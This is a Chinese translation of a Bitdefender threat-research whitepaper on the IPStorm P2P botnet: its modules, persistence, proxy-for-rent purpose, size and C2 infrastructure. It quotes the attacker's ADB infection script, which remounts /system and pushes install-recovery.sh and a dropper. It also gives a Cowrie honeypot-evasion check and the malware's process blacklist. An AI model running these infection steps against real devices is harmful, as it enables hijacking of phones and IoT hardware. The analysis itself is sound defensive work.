**译者：知道创宇404实验室翻译组**  
**原文链接：<https://www.bitdefender.com/files/News/CaseStudies/study/376/Bitdefender-Whitepaper-IPStorm.pdf>**

### 摘要：

Bitdefender的研究人员发现Interplanetary Storm Golang僵尸网络可以用作高度匿名的proxy-network-as-a-service和基于订阅的模型租用。攻击者精通使用Golang和开发实践，并且善于隐藏管理节点。Interplanetary
Storm还有一个复杂的、模块化的设备，该设备用来寻找新目标、推送和同步新版本恶意软件，对被感染者执行任意命令并与C2服务器通信公开web API。

我们估计僵尸网络的规模在9000台左右。绝大多数使用的是安卓系统，大约1%使用的是Linux。极少数的设备的操作系统是Windows，但它们似乎运行的是旧版本的恶意软件。在新的迭代中，IPStorm通过攻击基于Unix的系统（Linux、Android和Darwin）运行面向Internet的SSH服务器弱凭据或不安全的ADB服务器。从地理分布来看，这个僵尸网络似乎建立在亚洲，但是它遍布全球，受害者在巴西、乌克兰、美国、瑞典和加拿大等国家。

### 主要发现

  * 僵尸网络可能作为匿名代理网络租用
  * 可将受损设备用作代理
  * 僵尸网络遍布全球
  * 采用多层次订阅型模式进行租赁
  * 迄今已有100多个规范修订
  * 僵尸网络背后的基础设施

### 介绍

2019年6月，来自[Anomali](https://www.anomali.com/blog/the-interplanetary-storm-new-malware-in-wild-using-interplanetary-file-systems-ipfs-p2p-network
"Anomali")的研究人员首次报道了Interplanetary
Storm（IPStorm）。2020年5月，当这个僵尸网络攻击我们的SSH蜜罐时，我们发现了它。从那以后，该恶意软件一直在不断发展。

在其新的迭代中，IPStorm通过攻击基于Unix的系统（Linux、Android和Darwin）进行传播，这些系统运行面向互联网的SSH服务器，而这些SSH服务器具有弱凭据或不安全的ADB服务器。

它的功能包括为设备后门（运行shell命令）和生成恶意流量（扫描互联网和感染其他设备）。我们已经确定僵尸网络的主要目的是将被感染的设备放入代理服务器中，这是他们营利计划的一部分。具有这一目标的僵尸网络在过去已经出现过（例如：[dark_neunexus](https://labs.bitdefender.com/2020/04/new-dark_nexus-iot-botnet-puts-others-to-shame/
"dark_neunexus")、[ngiweb](https://blog.netlab.360.com/an-analysis-of-linux-ngioweb-botnet-en/ "ngiweb")、[Gwmndy](https://blog.netlab.360.com/some-fiberhome-routers-are-being-utilized-as-ssh-tunneling-proxy-nodes-2/
"Gwmndy")）。

### 时间线

IPStorm的发展可以分为三个阶段：

  * Major 0, Minor 0：Anomali去年报道，专门针对Windows
  * Major 0, Minor 1：今年出现（2020年5月），目标是Unix衍生系统
  * Major 0, Minor 2：最新进展（2020年9月），从publish-subscribe模式转换而来

在撰写本文时，最新版本是0.2.05a。

### Bot生命周期

Bot启动代码初始化IPFS节点并启动专用于Bot的每个子模块。它将恶意程序进程的oom_adj分数设置为-17，如果系统可用内存不足，这样可以确保不会被终止。然后，它确保只有一个恶意软件实例在设备上运行。任何匹配进程都将被终止，并且它的可执行文件已被删除。
一个2048位RSA密钥对产生，并存储在文件系统的可写路径中。此密钥属于IPFS节点并具有唯一标识。节点被实例化并启动引导进程，使IPFS网络中的其他节点可以访问它。与僵尸网络中其他对等方的连接是通过定期“announcing”自己来确保的，除此之外，它寻找发布相同公告的对等方（更多信息请参阅“P2P通信”部分）。

通过在IPFS上收集指纹信息，我们从info主题中检索到这样一个条目，示例如下（其中有些信息是为隐私而编辑的）：

    
    
     “T” : 1592892637,
     “HostID” : “Qmf4[________________redacted________________]”,
     “Version” : “0.1.81a”,
     “Platform” : “linux-arm7”,
     “SystemInfo” : {
     “GoOS” : “linux”,
     “Kernel” : “Linux”,
     “Core” : “4.19.97-v7+”,
     “Platform” : “unknown”,
     “OS” : “GNU/Linux”,
     “Hostname” : “raspbx”,
     “CPUs” : 4
     },
     “Uid” : “0”,
     “Gid” : “0”,
     “UserName” : “root”,
     “UserDisplayName” : “root”,
     “UserHomeDir” : “/root”,
     “IsAdmin” : true,
     “ExecutablePath” : “/usr/bin/storm”,
     “InstallationPath” : “/usr/bin/storm”,
     “ComputerID” : “”,
     “LocalIPs” : null,
     “ExternalIP” : “[redacted]”,
     “Processes” : null
    }

另一个周期的goroutine的任务是在Bot的新版本可用时执行更新。在这种情况下，更新后的文件写入文件系统，重新建立恶意软件的持久性并重新启动进程。
它的持久性取决于操作系统。

  * 在Linux上，它使用[开源守护程序包](https://github.com/takama/daemon "开源守护程序包")创建一个名为storm的服务
  * 在Android上，它以读写方式重新装载文件系统，并覆盖/system/bin/install-recovery.sh文件
  * 在Darwin上，没有实现持久性方法

### P2P通信

在进行对等点之间的通信时，IPStorm利用了libp2p over提供的多种机制IPFS:

  * topics
  * content routing (node discovery)
  * libp2p protocols

针对所有节点的消息使用不同的方法（版本更新、文件校验和、具有特殊角色节点的IDs）和用于特定节点的消息（扫描目标、代理请求、shell命令）。

在第一种方法中，消息发布在主题上，所有节点都订阅该主题并处理信息。在DDB（分布式数据库）的情况下，发布在主题上的消息用于在所有节点。虽然消息可能会因其在网络中的传播方式而无序，但是包含时间戳使每个节点只保留给定密钥的最新值。确保同行Bot可以使用时间戳进行适当的协调，它通过从一个公共列表中查询一个随机条目来更新它的时间NTP服务器。

第二种方法适用于扫描模块，例如：中央实体发出扫描命令，把目标分配给机器人。这是通过使用IPStorm特有的协议连接到每个Bot来实现的。

### 主题

主题是libp2p [Publish-Subscribe](https://docs.libp2p.io/concepts/publish-subscribe/ "Publish-Subscribe")模式实现的一部分。IPStorm使用以下主题：

![](https://images.seebug.org/content/images/2020/10/1bc10931-7a36-417b-96c4-617dd2fa8e75.png-w331s)

从0.2.*版本开始，IPStorm放弃了这些主题，转而使用web API模块进行集中化设计。

### 协议

当一个对等点想要打开与另一个对等点的直接连接时，libp2p[协议](https://docs.libp2p.io/concepts/protocols/
"协议")就会发挥作用。源拨号指定多[地址](https://docs.libp2p.io/concepts/addressing/
"地址")和协议的目标对等方。协议用于标识在目标节点中调用哪个处理程序，目标节点只接受其支持的协议的连接。

IPStorm定义了一套自己的协议：

![](https://images.seebug.org/content/images/2020/10/d3f3cb4e-8f3a-4407-890f-f7414c38e918.png-w331s)

### 节点发现

libp2p提供的内容路由接口可用于对等发现。节点将自己公布为某些CID（内容ID）的提供者，同样地，搜索提供者，定位对等节点。这是通过[go-libp2p-kad-dht](https://github.com/libp2p/go-libp2p-kad-dht "go-libp2p-kad-dht")（routing.FindProviders）提供的接口直接与CIDs合作来实现的。[go-libp2p-discovery](https://github.com/libp2p/go-libp2p-discovery "go-libp2p-discovery")提供了另一种方法，使用可以转换为CIDs（routing.FindPeers,
routing.Advertise）的名称空间。

对于IPStorm使用的每种类型，我们列出：

![](https://images.seebug.org/content/images/2020/10/4dc394bc-8444-4e99-9811-2bcd4e069629.png-w331s)

### Relays

在0.1.43a和0.1.51a之间的某个点，IPStorm引入了对电路Relays的支持。这可能是为了提高NAT之后的节点的可达性，或者试图隐藏管理节点。在该功能实现后不久，大多数管理节点不再发布其IP地址，而是使用Relays电路。

例如，`qmeb3x55maokhzfzfysuhfgkzwaz3zftqcqz6qiaeqamo7a2`列出以下地址（除其他外）：

`/ip4/78.x.x.120/tcp/52202/p2p/QmVoDwmbfwSUPT3ds5ytWRwhoWZkzgE9qFHiYHfJQ5cAnm/p2pcircuit/p2p/Qmeb3X55MaoKhZfYsUHFgkZWAz3ZFtQCQz6qiaEqamo7a2`

这意味着78.x.x.120:52202处的节点（ID为QmVoDwmbfwSUPT3ds5ytWRwhoWZkzgE9qFHiYHfJQ5cAnm的storm节点）用作与Qmeb3X55MaoKhZfYsUHFgkZWAz3ZFtQCQz6qiaEqamo7a2建立连接。

自从版本0.1.85a以来，这个特性的使用已经减少了，大多数节点都列出了它们的外部IP。然而，一些节点仍然隐藏在中继后面，在某些情况下，中继不属于僵尸网络。另一方面，另一个短期的尝试就是用域来隐藏所涉及的管理节点IP地址。这些域是用[DNSPod](http://www.dnspod.com/docs/domains.html
"DNSPod")（域名注册服务）生成的，用于在DDB主题上作为代理后端播发的多个地址：

    
    
    /dns4/splendidobed.site/tcp/443/ipfs/QmViHGaXaG5JzbvH2Xs1Ro19fvoKG1KqpPGMYWLc4ckEAV
    /dns4/spenso.me/tcp/443/ipfs/QmViHGaXaG5JzbvH2Xs1Ro19fvoKG1KqpPGMYWLc4ckEAV

通过它们的配置，IPStorm节点可以同时使用中继器进行出站连接（EnableAutoRelay（））和节点充当中继跃点（EnableRelay(circuit.OptHop)）。如果想要使用IPStorm节点作为跃点，必须完成握手：

  * 使用/strelayp/1.0.0协议连接到继电器
  * 发送字符串“HSR”
  * 继电器应响应“+\n”

启用了此功能的节点（并非所有版本都是这样）在DDB上或使用特定的发现命名空间（更多内容请参阅“节点发现”部分）。

### Modules

IPStorm版本0.2.05a中的包：

    
    
    Packages:
    main
    storm/backshell
    storm/ddb
    storm/filetransfer
    storm/logging
    storm/malware-guard
    storm/node
    storm/powershell
    storm/proxy
    storm/reque_client
    storm/starter
    storm/statik
    storm/util
    storm/web_api_client

过去还有其他包，但已被替换或停止使用：

    
    
    storm/avbypass
    storm/bootstrap
    storm/handshake
    storm/identity
    storm/peers_cache
    storm/storm_runtime
    storm/vpngate

在本节中，我们将对包含其核心功能的模块进行技术分析。

#### 恶意软件卫士

此任务定期执行，查找竞争的恶意软件。如果进程的名称、可执行路径或命令行参数包含黑名单中的任何字符串，则认为进程可疑。进程被终止，它们的可执行文件被删除。黑名单上的字符串是：

    
    
    /data/local/tmp
    rig
    xig
    debug
    trinity
    xchecker
    zpyinstall
    startio
    startapp
    synctool
    ioservice
    start_
    com.ufo.miner

#### Backshell

此模块用于在受感染的设备上运行shell命令。shell是通过libp2p访问的协议连接（ID为/sbst/1.0.0）。该模块缺少身份验证或授权。

#### DDB

分布式数据库（DDB）被用来存储和共享配置数据。对于同步，每个Bot定期发布本地数据库中有关IPFS主题的条目。用更新的时间戳更新本地条目。在这个过程中，只有受信任的节点才有权更新某些密钥。libp2p（pubsub）实现消息签名，Bot检查公钥属于硬编码消息的可信密钥列表。

从相关主题检索到的DDB条目的示例如下：

    
    
    {
     “Command” : “SetWithTTL”,
     “Key” : “file-checksum/storm_android-amd64”,
     “Value” : “12c3368e17c04f49cfea139148b63fd1ab1a41e26c113991c2bb0835dd02495b”,
     “TTL” : 3600000000000,
     “T” : 1598897109
    }

该命令是指应该在数据库上执行的操作。在这种情况下，该项有一个时间tolive（TTL），这意味着它应该在发布后经过一个时间间隔（TTL值）后被丢弃。键和值与数据库中存储的实际数据相对应。

根据关键字，值具有以下含义：

![](https://images.seebug.org/content/images/2020/10/e3fc82b4-2220-4654-bcf2-d273c4d5f235.png-w331s)

数据库是一个关联数组，但是要区别于发表在这个主题上的（键，值）。Set和SetWithTTL命令存储与键相关联的值，替换前面的值。对于SAdd命令，与数据库中的键相关联的值是一个列表，消息中的值附加到该列表中。

虽然在最新的示例中，该模块仍用于本地存储，但同步机制已被使用webapi的管理节点查询所取代。

#### VPNGate

此模块用于对公共VPN服务VPNGate的API进行抓取。

程序执行一个请求`[http://www.vpngate.net/api/iphone/](http://www.vpngate.net/api/iphone/
"http://www.vpngate.net/api/iphone/")`并解析CSV响应。获得的关于这些VPN服务器的信息将发布在IPStorm的一个主题上。

将此模块包含在僵尸网络中的原因可能是为了克服限制为请求返回的服务器列表的VPNGate。通过僵尸网络以分布式方式抓取，可以发现更广泛的VPN服务器选择。

#### Reque

reque包（可能代表来自“command-and-control”的请求”）用于与SSH和ADB服务器的协同扫描以及蠕虫式感染相关的功能。Bot通过/sreque/1.0.0协议连接到一个称为请求服务器的IPFS节点。来自此服务器的命令分布在一个工作队列中。该模块设计为易于扩展以处理新命令。目前，有两个命令处理程序，分别用于tcp
scan和brute ssh命令。

tcp-scan命令用于扫描一组端口上的IP范围。如果目标端口列表包含端口22或5555，则模块将分别遵循SSH和ADB协议。

brute-ssh的一个参数和一个地址列表作为其参数。如果Bot成功地在目标设备上获得shell，它就会执行感染有效载荷，将受害者变成IPStorm
Bot。

作为一种[蜜罐规避](https://github.com/cowrie/cowrie
"蜜罐规避")技术，在感染前使用正则表达式验证shell的提示步骤。regex匹配“svr04”字符串，它是Cowrie蜜罐的主机名。

在SSH的情况下，Bot表现出蠕虫行为，而对于ADB，感染阶段不是由Bot执行的，Bot只将找到的关于设备的信息中继回reque
manager。实际的感染是由一个bot-herder控制的节点执行的，该节点通过ADB连接到受害者并发出感染有效载荷。根据我们从ADB蜜罐收集的数据，攻击者的脚本相当于：

    
    
    adb connect $IP:5555
    adb root && adb wait-for-device
    adb remount && adb wait-for-device
    adb shell mount -o rw,remount /data; mount -o rw,remount /system; mount -o rw,remount /
    adb shell echo “{
     \”user\”:\”$(whoami 2>/dev/null)\”,
     \”id\”:\”$(id 2>/dev/null)\”,
     \”root_access\”:\”$(getprop persist.sys.root_access 2>/dev/null)\”,
     \”machine\”:\”$(uname -m 2>/dev/null)\”,
     \”curl\”:\”$(which curl 2>/dev/null)\”,
     \”wget\”:\”$(which wget 2>/dev/null)\”,
     \”adb\”:\”$(which adb 2>/dev/null)\”,
     \”iptables\”:\”$(which iptables 2>/dev/null)\”,
     \”ipset\”:\”$(which ipset 2>/dev/null)\”,
     \”abi\”:\”$(getprop ro.product.cpu.abi 2>/dev/null)\”,
     \”abi2\”:\”$(getprop ro.product.cpu.abi2 2>/dev/null)\”,
     \”abilist\”:\”$(getprop ro.product.cpu.abilist 2>/dev/null)\”,
     \”abilist32\”:\”$(getprop ro.product.cpu.abilist32 2>/dev/null)\”,
     \”abilist64\”:\”$(getprop ro.product.cpu.abilist64 2>/dev/null)\”,
     \”sdk\”:\”$(getprop ro.build.version.sdk 2>/dev/null)\”
    Bitdefender DracoTeam • WHITEPAPER
    Looking Into the Eye of the Interplanetary Storm
    }”
    adb push install-recovery.sh /system/bin/install-recovery.sh
    adb push storm-install.sh /system/bin/storm-install.sh
    adb push sldrgo /system/bin/sldrgo

通过echo命令收集的指纹信息用于调整剩余的有效载荷。最后的文件sldrgo是为受害者的CPU架构编译的UPX压缩二进制文件。它的目的是下载主Bot有效载荷。

#### Proxy

IPStorm代理通过libp2p流量对[SOCKS5](https://github.com/armon/go-socks5
"SOCKS5")协议进行隧道传输。该模块同时执行两个任务：维护与后端的连接和处理传入流。

代理后端使用DDB（旧版本）或节点发现机制定位。然后，bot使用/sbpcp/1.0.0协议连接到后端，并定期使用其外部IP地址和延迟。

在初始化阶段，它使用开源的SOCKS5实现在随机端口上启动本地SOCKS5代理。实例化了/sbptp/1.0.0协议的流处理程序。这允许节点从libp2p流中取消封装SOCKS5代理流量，并将其转发给本地代理。同样，响应通过libp2p流转发回对等端。在旧版本中，这是使用双向管道的特殊实现来完成的：

    
    
    type proxy.BidirectionalPipe struct{
     ctx context.Context
     lrw io.ReadWriter
     rrw io.ReadWriter
     pipe1 *proxy.Pipe
     pipe2 *proxy.Pipe
    }
    type proxy.Pipe struct{
     src io.ReadWriter
     dst io.ReadWriter
    }

在较新的版本中，这是通过使用gostream包来抽象的。

传入连接的对等方在模块的逻辑中不需要相同，但它们都被称为（并在DDB中标记）代理后端。根据我们对IPStorm
Bot的观察，代理模块在启动后不久就会收到连接请求。连接源是作为代理后端的同一节点（Qmeb3X55MaoKhZfYsUHFgkZWAz3ZFtQCQz6qiaEqamo7a2）。我们假设这是由于代理检查机制造成的，并且没有调查代理是否最终接收到真实的流量。

![](https://images.seebug.org/content/images/2020/10/ea0b3a04-9568-43b2-99fb-e8859d6a6d4a.png-w331s)

#### Filetransfer

IPStorm以分布式方式托管恶意软件二进制文件，每个Bot“seeding”一个或多个样本。这个功能在filetransfer包中实现。Bot定期检查更新：它从DDB或通过webapi检索最新版本号。如果有一个新版本可用，它将被下载，然后使用新的二进制文件杀死并重新生成bot。这个过程将生成一个新的密钥对。当与本机体系结构和操作系统匹配的示例存储在文件系统中时，其他示例存储在RAM中。根据可用的RAM，许多其他示例被下载并在本地HTTP服务器上提供服务。此服务器在Bot启动时在随机端口上打开，并在DDB中公布。对于每个托管的示例，条目“seeder:”+checksum和“seeder
http:”+checksum被格式化为Bot的对等ID或其外部IP和端口分别是HTTP服务的。在较新的版本中，这被替换为向2WebAPI发布等效数据端点。

下载样本的过程有几个步骤：

  * 检索特定CPU架构和操作系统的最新示例的校验和
  * 为具有该校验和的文件查找种子生成器
  * 通过HTTP或IPFS（protocol/sfst/1.0.0）连接到对等机并下载示例
  * 验证校验和

[statik](https://github.com/rakyll/statik
"statik")模块用于将zip文件存储到内存中，从中可以单独检索文件。档案包含：

![](https://images.seebug.org/content/images/2020/10/6bc63a79-1098-4bc5-a83c-34b023d6ad05.png-w331s)
![](https://images.seebug.org/content/images/2020/10/a2a46250-41af-4129-a574-42cbf728f1a1.png-w331s)

第一个脚本，linux/install.sh，在SSH感染中用作主负载的下载器/dropper。这个脚本是由bot-adhoc定制的，添加了一个变量，其中包含了有效负载的最新“seeders”。当Bot更新时，storm_android中的脚本用于重新配置android设备上的持久性。

#### WebAPI

自从0.1.92a版本的IPStorm开始从PubSub模型过渡到更集中的设计。机器人将不再协调使用其他机器人发布的消息。相反，所有信息由一个或多个C2节点聚合，这些节点公开了一个Web
API。

P2P协议采用了LibGo的[HTTP分层连接包](https://github.com/libp2p/go-libp2p-http
"HTTP分层连接包")。IPStorm代码中称为“web API后端”的服务由其对等id寻址，并使用对等发现机制进行发现。

这种转变的原因尚不清楚。一些可能的解释是，开发人员已经意识到当事方可以读取并可能干扰主题并希望获得更多控制权，或者同步不可靠。后者可以解释为什么我们看到多个Bot使用旧的恶意软件版本而被卡住，尽管代码设计为自动更新到最新的可用版本。

除了确保p2p同步由bot-herder控制的节点监督外，消息保持身份验证，并使用与DDB相同的可信密钥集强制授权。

以下API公开了以下终结点：

![](https://images.seebug.org/content/images/2020/10/fdf50585-7fec-4560-8fbe-ba960d233e9f.png-w331s)

### 僵尸网络映射

在我们监控僵尸网络的过程中，我们使用了来自多个来源的数据：

  * 公开的“peer info”（ID、公钥、地址和版本信息）
  * 发布主题信息：DDB主题、信息主题
  * 在DHT中查询属于僵尸网络的对等方

在第一种方法中，我们使用IPFS爬虫收集的对等信息数据库。属于僵尸网络的节点很容易通过它们的代理版本来识别，这类似于HTTP协议中的用户代理。

对于使用go-libp2p构建的应用程序，AgentVersion默认设置为主包的名称。IPStorm节点的AgentVersion设置为storm。此属性使我们能够找到不在其他频道（如info主题）上声明自己的节点。

其次，我们使用相同的机制，使IPStorm Bot能够找到对等点：在DHT中查询僵尸网络中不同类别节点（常规节点或具有特殊角色的节点）提供的特定内容id。

有关Bots的id的信息也可以在info主题和DDB主题中找到。我们使用DDB主题中的数据来跟踪由威胁参与者控制的对等方的版本和角色。信息主题中的数据提供了按国家、设备类型和操作系统划分的受害者分布情况。

在估计僵尸网络的规模时，我们面临的问题是，没有明确的方法来区分两个节点id是否代表同一个受感染的设备。可以通过版本ID更新或重新感染。外部IP也不是一个好的标识符，因为它会随着时间而变化，或者因为多个节点可能在NAT之后。

我们根据一周内不同的网络规模，平均数周内看到的僵尸数量大约有9000台设备。绝大多数人的操作系统是Android，约1%使用Linux。

根据他们在信息主题上发布的消息，仍然有许多设备运行IPStorm
0.1*之前的版本，并将Windows作为其操作系统。由于新的活动只关注Unix系统，因此，值得注意的是，自2019年以来，这些Bot一直在这些设备上运行。

虽然指纹不包含有关设备型号的特定信息，但可以从操作系统，内核版本，有时还有主机名和用户名。基于此，我们确定了路由器、NAS设备、UHD接收器和多功能板和微控制器（如Raspberry
Pi），它们可能属于物联网设备。

以下数字是由外部IP确定的受害者的地理分布。他们大多数在亚洲。

僵尸网络总共影响了98个国家，就其扫描互联网的能力而言，它似乎很强大，但是通过对攻击媒介的选择，攻击目标是在某些国家更普遍的设备类别。我们的蜜罐平均每天收到3500次来自这个僵尸网络的攻击，相当于流量的很大一部分。

![](https://images.seebug.org/content/images/2020/10/10bcbe92-e789-41b6-be5d-b7a691aed4f6.png-w331s)

按国家分类的IPStorm受害者分布情况：

![](https://images.seebug.org/content/images/2020/10/604801c8-3e19-4959-b37c-9133cfa831e7.png-w331s)

IPStorm受害者的精确位置分布：

![](https://images.seebug.org/content/images/2020/10/fcfab090-4c81-4580-9629-62765071ec66.png-w331s)

### 基础设施

虽然我们没有设法从管理基础设施中获得大量二进制文件，但它们很可能是在同一个项目中开发的，我们可以在Bot二进制文件中找到一些与它们相关的线索。管理节点使用相同的AgentVersion，这是基于主包的路径设置的，这一事实支持了这一假设。

包中有一些附加的包，其中没有代码（除了一些初始化函数）：

    
    
    storm/commander/web_app/router
    storm/proxy/checker
    storm/util/storm_runtime

这些包可能与管理受害者的web界面和代理可用性的自动检查器相对应。

据我们所知，从管理基础设施分配给节点的特殊角色是：

  * proxy backend
  * proxy checker
  * reque manager
  * web API backend
  * trusted node
  * development node

观察到以下节点：

  * ID: QmW1ptn27xSAgZqBvJwhaGWmJunjzqAGt1oAj4LdVAm9vM  
Roles: trusted, web API backend  
Addresses: /ip4/212.x.x.100/tcp/444, /ip4/212.x.x.100/tcp/5554,
/ip4/88.x.x.34/tcp/444

  * ID: QmddMf2PfNXu6KVKp63rcLhWpNqQdaQdPZzP649dRXS6et  
Roles: unknown  
Addresses: /ip4/212.x.x.100/tcp/443

  * ID: Qmeb3X55MaoKhZfYsUHFgkZWAz3ZFtQCQz6qiaEqamo7a2  
Roles: trusted, web API backend, reque manager, proxy backend, proxy checker  
Addresses: /ip4/54.x.x.216/tcp/444, /ip4/54.x.x.216/tcp/5554,
/ip4/101.x.x.240/tcp/443, /ip4/101.x.x.222/  
tcp/443, /ip4/111.x.x.85/tcp/443

  * ID: QmViHGaXaG5JzbvH2Xs1Ro19fvoKG1KqpPGMYWLc4ckEAV  
Roles: proxy backend, reque manager  
Addresses: /ip4/54.x.x.216/tcp/443, /ip4/54.x.x.216/tcp/5555

  * ID: QmShLAfGGVDD32Gsx5Q2YbuhdDm1uHAmV8aozV6uRKAZdW  
Roles: trusted  
Addresses: unknown

  * ID: QmNWL3UTHbfCxhKA8Lu9aL2XpPGGYQmN4dihXsaCapiyNx  
Roles: trusted  
Addresses: unknown

  * ID: QmV7UYLoDmUv3XViiN1GqrsC6t8WLPGmCKTMAJ544x2pbA  
Roles: proxy backend  
Addresses: /ip4/45.x.x.194/tcp/443

  * ID: QmdACwNe1JdkD2N45LRbcFthPpEVQVtfBvuHFHQ4cFMcAz  
Roles: development  
Addresses: unknown (External IP: 163.172.x.x)

  * ID: QmNoV8qAgLTEo1nQN8wmusi9U9kmArUjVNsKY4TdYS1wvT  
Roles: development  
Addresses: unknown

随着时间的推移，其中一些节点已经改变了它们的地址和角色。所列信息来源于最近几个月收集的可公开获取的信息。我们只包含外部IP和端口的多地址。对于某些节点，我们的数据只包含中继电路地址，因此它们的地址被列为未知。

有趣的是，一个由7个节点组成的组出现在2020年9月17日，宣布自己是web API CID的提供者：

    
    
    QmNeV49LPkgQENkpSmg6q8nB1jypY74jhtWxP9rANUQubd
    QmRG9bwpWumxkNwGbceiMXmikAeNDw48kiTRaJSt8rSmzp
    QmXPUhUy4e2jg6dqjfsTnseC5m5KHgZvqMr6AwVutdcQGL
    QmYmDUkGJJ5K2BQ6JYuJeN2SJB3wfDg2N78th6tMEmHgSF
    QmbNwkGiHrK9XcP6n2vMZh9sZMoicvcrhaTbtXMzoC8rp1
    QmbcbZb8Jq8u44oCqna5h2ZBjSpRT42dNLDDNCyuSfGu3L
    Qmek3KNuJY3eRbSGZ9zm2M8yYLb7bMeA28gMswQXarhbmW

我们无法确定它们的来源和目的。一种理论认为，它们可能属于试图用[Sybil](https://en.wikipedia.org/wiki/Sybil_attack
"Sybil")攻击摧毁僵尸网络：Bot试图到达虚假的Web API节点，而依赖于该模块的功能受到阻碍。

### 结论

我们相信Interplanetary
Storm僵尸网络不仅有能力作为租用基础设施的匿名代理，而且具有高度活跃的开发周期。僵尸网络的主要目的似乎是财务上的，因为代码经过了大量的修改，以创建一个可靠和稳定的代理基础设施。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1373/>

